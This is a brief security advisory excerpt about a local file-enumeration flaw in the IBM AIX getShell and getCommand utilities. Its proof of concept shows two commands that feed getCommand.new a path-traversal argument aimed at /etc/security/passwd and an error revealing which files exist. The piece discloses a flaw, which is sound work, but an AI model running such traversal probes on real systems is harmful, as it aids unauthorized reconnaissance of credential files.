IBM AIX is prone to a local vulnerability in getShell and getCommand. This issue may let local attackers enumerate the existence of files on the computer that they wouldn't ordinarily be able to see.

-bash-3.00$./getCommand.new ../../../../../../etc/security/passwd
-bash-3.00$./getCommand.new ../../../../../../etc/security/passwd.aa
fopen: No such file or directory
